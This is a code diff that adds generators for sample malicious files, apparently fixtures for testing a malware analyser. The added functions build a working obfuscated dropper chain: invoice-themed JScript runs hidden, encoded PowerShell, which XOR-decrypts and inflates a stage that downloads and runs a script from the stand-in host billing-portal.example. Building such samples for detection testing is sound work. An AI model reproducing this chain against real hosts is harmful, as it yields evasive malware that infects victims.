@@ -1049,6 +1049,60 @@ sh.Run(dec(data, k), 0, false);
     return js.encode("utf-8")
 
 
+def _xor_deflate_stager(final: str, key: str = "inv") -> str:
+    """PowerShell stager: base64 blob XOR-decrypted with a string key, whose
+    plain text is a Deflate-compressed stage that runs ``final``."""
+    import base64
+    import zlib
+
+    c = zlib.compressobj(9, zlib.DEFLATED, -15)
+    comp = base64.b64encode(c.compress(final.encode()) + c.flush()).decode()
+    stage2 = ("$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String('" + comp + "'))\n"
+              "IEX (New-Object IO.StreamReader(New-Object IO.Compression.DeflateStream($s, "
+              "[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()")
+    kb = key.encode()
+    blob = base64.b64encode(bytes(b ^ kb[i % len(kb)] for i, b in enumerate(stage2.encode()))).decode()
+    url = ",".join(str(ord(ch) ^ 0x2A) for ch in "http://billing-portal.example/inv/beacon")
+    return (f"# invoice-2024-0613 payment sync\n$k = '{key}'\n"
+            f"$b = [Convert]::FromBase64String('{blob}')\n"
+            "for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = $b[$i] -bxor $k[$i % $k.Length] }\n"
+            f"$u = -join (({url}) | %{{[char]($_ -bxor 0x2a)}})\n"
+            "iex ([Text.Encoding]::ASCII.GetString($b))\n")
+
+
+_CHAIN_FINAL = ("IEX (New-Object Net.WebClient).DownloadString('http://billing-portal.example/inv/stage4.ps1'); "
+                "Start-Process $env:TEMP\\inv_viewer.exe")
+
+
+def xor_stager_ps1() -> bytes:
+    """PowerShell stager: XOR (string key) -> Deflate -> final download+run,
+    plus a URL hidden in a char array XOR-ed with 0x2a. Inert (*.example)."""
+    return _xor_deflate_stager(_CHAIN_FINAL).encode("utf-8")
+
+
+def chain_dropper_js() -> bytes:
+    """JScript whose XOR-decrypted payload is ``powershell -enc <stager>``; the
+    stager XOR-decrypts and inflates the final stage. Exercises the whole chain
+    JS sandbox -> PowerShell -enc -> XOR -> Deflate -> final command."""
+    import base64
+
+    enc = base64.b64encode(_xor_deflate_stager(_CHAIN_FINAL).encode("utf-16-le")).decode()
+    payload = f"powershell -nop -w hidden -enc {enc}"
+    key = "Fact2024"
+    arr = ",".join(str(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(payload))
+    js = f"""// invoice viewer helper
+var k = "{key}";
+var data = [{arr}];
+function dec(a, key) {{
+  var o = "";
+  for (var i = 0; i < a.length; i++) {{ o += String.fromCharCode(a[i] ^ key.charCodeAt(i % key.length)); }}
+  return o;
+}}
+new ActiveXObject("WScript.Shell").Run(dec(data, k), 0, false);
+"""
+    return js.encode("utf-8")
+
+
 def build_all() -> dict[str, bytes]:
     out: dict[str, bytes] = {
         "sample.docx": word_docx(), "sample.docm": word_docm(),
@@ -1057,6 +1111,7 @@ def build_all() -> dict[str, bytes]:
         "sample.eml": eml_doc(), "sample.emlx": emlx_doc(), "sample.msg": msg_doc(),
         "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
         "sample_obf_techniques.js": obf_techniques_js(),
+        "sample_chain_dropper.js": chain_dropper_js(), "sample_xor_stager.ps1": xor_stager_ps1(),
         "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
         "sample_dropper.bat": dropper_bat(), "sample_ioc_noise.bat": ioc_noise_bat(), "sample_loader.hta": loader_hta(),
         "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
